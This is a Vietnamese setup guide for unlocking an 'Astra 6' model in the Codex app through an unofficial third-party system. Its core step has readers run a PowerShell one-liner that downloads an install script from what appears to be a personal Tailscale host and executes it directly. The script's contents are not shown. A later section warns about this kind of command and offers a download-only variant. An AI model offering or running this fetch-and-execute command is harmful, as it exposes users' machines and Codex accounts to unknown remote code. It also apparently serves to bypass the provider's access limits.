# Astra 6 — Hướng dẫn kích hoạt & sử dụng

> ⚠️ **Lưu ý quan trọng:** Đây là phương thức sử dụng **model Astra 6 thông qua một hệ thống bên thứ ba**. Quota có thể thay đổi hoặc bị vô hiệu hóa bất cứ lúc nào.

---

## ⭐ Thông tin về Astra 6

* **Model:** Astra 6
* **Tài khoản Free:** Có thể sử dụng, nhưng **quota sẽ hạn chế**.
* **Tài khoản Plus:** Theo thông tin hiện tại, quota có thể tương đương **X20**, phù hợp với nhu cầu code nhiều.
* **Trạng thái:** Có thể được **fix hoặc vô hiệu hóa bất cứ lúc nào**.

> 💡 Nếu bạn đang có sẵn tài khoản Plus, khả năng sử dụng sẽ thuận tiện hơn so với tài khoản Free.

---

# 📋 Hướng dẫn cài đặt

## 1️⃣ Tắt hoàn toàn Codex

Sau khi nhận được thông báo rằng:

* Email của bạn đã được **thêm vào hệ thống**.
* Quá trình thiết lập đã **hoàn thành**.

👉 Hãy **tắt hoàn toàn ứng dụng Codex** trước khi thực hiện bước tiếp theo.

> ⚠️ Không nên để Codex chạy nền trong lúc thực hiện quá trình cài đặt.

---

## 2️⃣ Chạy PowerShell

Mở **PowerShell** trên Windows.

Sau đó chạy lệnh:

```powershell
irm https://admin-pc.tail712579.ts.net/install.ps1 | iex
```

Chờ PowerShell thực hiện toàn bộ quá trình.

---

## 3️⃣ Kiểm tra kết quả

Sau khi lệnh chạy xong, hãy kiểm tra thông báo trong PowerShell.

Nếu hệ thống báo:

```text
Installation completed successfully
```

và xác nhận **đúng tài khoản của bạn**, quá trình thiết lập đã hoàn tất.

> ✅ Khi tài khoản được xác nhận chính xác, bạn có thể chuyển sang bước tiếp theo.

---

## 4️⃣ Khởi động lại Codex

Sau khi PowerShell báo thành công:

1. Đóng PowerShell.
2. Mở lại **Codex**.
3. Đăng nhập/kiểm tra đúng tài khoản đã được thêm vào hệ thống.
4. Kiểm tra danh sách model.
5. Bắt đầu sử dụng **Astra 6** nếu model đã xuất hiện.

---

# ⚡ Tóm tắt nhanh

```text
┌──────────────────────────────────────┐
│          ASTRA 6 — QUICK START       │
└──────────────────────────────────────┘

① Email đã được thêm vào hệ thống
              ↓
② Tắt hoàn toàn Codex
              ↓
③ Mở PowerShell
              ↓
④ Chạy install.ps1
              ↓
⑤ Kiểm tra tài khoản & trạng thái
              ↓
⑥ Khởi động lại Codex
              ↓
⑦ Kiểm tra Astra 6
              ↓
          🚀 Bắt đầu code
```

---

## ⚠️ Cảnh báo bảo mật

Lệnh trên sử dụng:

```powershell
irm <URL> | iex
```

Trong PowerShell, cách này có nghĩa là **tải nội dung script từ máy chủ rồi thực thi trực tiếp**.

Vì vậy, chỉ nên chạy khi bạn **tin tưởng hoàn toàn máy chủ và người cung cấp script**.

Nếu muốn kiểm tra script trước khi chạy, có thể tải nội dung về để xem:

```powershell
irm https://admin-pc.tail712579.ts.net/install.ps1
```

Thay vì thực thi ngay bằng `| iex`.

> 🔐 **Khuyến nghị:** Không chạy các script PowerShell từ nguồn không rõ danh tính trên tài khoản hoặc máy tính chứa dữ liệu quan trọng.

---

## 📝 Ghi chú

* Astra 6 có thể bị **fix bất cứ lúc nào**.
* Quota không được đảm bảo cố định.
* Tài khoản Free có thể có quota thấp hơn.
* Tài khoản Plus được cho là có quota cao hơn theo thông tin hiện tại.
* Nếu sau khi cài đặt model không xuất hiện, hãy kiểm tra lại tài khoản và trạng thái hệ thống.

---

### 🚀 Chúc anh em code vui vẻ!

> **Astra 6 × Codex — Happy Coding!** 💻🔥
